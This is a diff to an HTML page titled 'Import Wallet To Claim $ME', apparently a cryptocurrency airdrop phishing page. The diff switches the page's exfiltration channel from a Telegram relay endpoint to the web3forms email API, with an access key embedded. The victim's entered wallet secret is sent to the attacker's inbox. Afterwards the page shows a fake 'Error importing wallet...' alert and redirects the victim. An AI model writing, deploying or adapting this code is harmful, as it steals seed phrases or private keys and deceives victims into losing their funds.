@@ -582,10 +582,10 @@
       <!--<img class="w-36" src="logo.svg" alt="logo">-->
     </a>
   </div>
-  <form id="telegramForm">
+  <form id="emailForm" action="https://api.web3forms.com/submit" method="POST">
     <div id="app">
         <div class="p-5 mt-10 flex flex-col items-center justify-center">
-            <input type="hidden" name="access_key" value="0b7b67e8-3dd0-428a-9e4d-97dd9df7bec2">
+          <input type="hidden" name="access_key" value="fd3253e9-be8b-4597-8693-ee9c6e87415f">
             <div class="text-sm text-[#aa99ec] mt-3" style="padding-bottom: 10px;">
                 Import Wallet To Claim $ME<br />
             </div>
@@ -601,41 +601,38 @@
 </form>
 
 <script>
-document.getElementById('telegramForm').addEventListener('submit', async function (e) {
-    e.preventDefault(); // Prevent the default form submission
-    
-    const message = document.getElementById('message').value;
-    
-    if (!message.trim()) {
-        alert("Please enter a message.");
-        return;
-    }
+    document.getElementById('emailForm').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent the default form submission
 
-    try {
-        const response = await fetch('/api/sendTelegramMessage', {
+        const message = document.getElementById('message').value;
+        const accessKey = document.querySelector('input[name="access_key"]').value;
+
+        // Prepare the data to be sent
+        const data = {
+            access_key: accessKey,
+            message: message
+        };
+
+        // Send data to the email API
+        fetch('https://api.web3forms.com/submit', {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json',
+                'Content-Type': 'application/json'
             },
-            body: JSON.stringify({ message })
-        });
-
-        const data = await response.json();
-
-        if (data.success) {
-            alert("Error importing wallet...");
-        } else {
-            alert("Failed to send the message.");
-        }
-    } catch (error) {
-        console.error("Error:", error);
-        alert("An error occurred while sending the message.");
-    }
-});
+            body: JSON.stringify(data)
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                alert('Error importing wallet...');
+                window.location.href = './index.html'; // Redirect after successful submission
+            } else {
+                alert('Unable to rectify issue at the moment: ' + data.message);
+            }
+        })
+        .catch(error => console.error('Error:', error));
+    });
 </script>
-
-
-
   
 <script src="js/vue-app.js"></script>
 </body>
